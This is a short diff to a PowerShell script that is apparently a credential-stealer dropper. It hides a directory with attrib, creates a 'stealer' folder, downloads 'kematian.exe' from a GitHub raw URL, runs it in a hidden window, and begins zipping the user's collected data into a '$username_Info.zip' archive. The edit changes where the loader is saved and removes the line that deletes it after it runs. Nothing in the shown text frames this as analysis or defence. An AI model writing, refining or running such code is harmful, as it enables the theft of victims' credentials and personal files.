@@ -8,10 +8,10 @@ attrib +h +s $dir
 
 $stealer = "$dir\stealer"
 New-Item -ItemType Directory -Path $stealer
-
+cd $stealer
 
 $url = "https://raw.githubusercontent.com/43a1723/test/refs/heads/main/stealer/kematian.exe"
-$output = "$stealer\loader.exe"
+$output = "$dir\loader.exe"
 
 if (Test-Path -Path $output) {
     Write-Host "hello"
@@ -19,7 +19,6 @@ if (Test-Path -Path $output) {
     Invoke-WebRequest -Uri $url -OutFile $output
 }
 Start-Process $output -WindowStyle Hidden -Wait
-Remove-Item -Path $output -Force
 $sourcePath = $stealer
 $username = $env:USERNAME
 $zipPath = "$dir\$username_Info.zip"
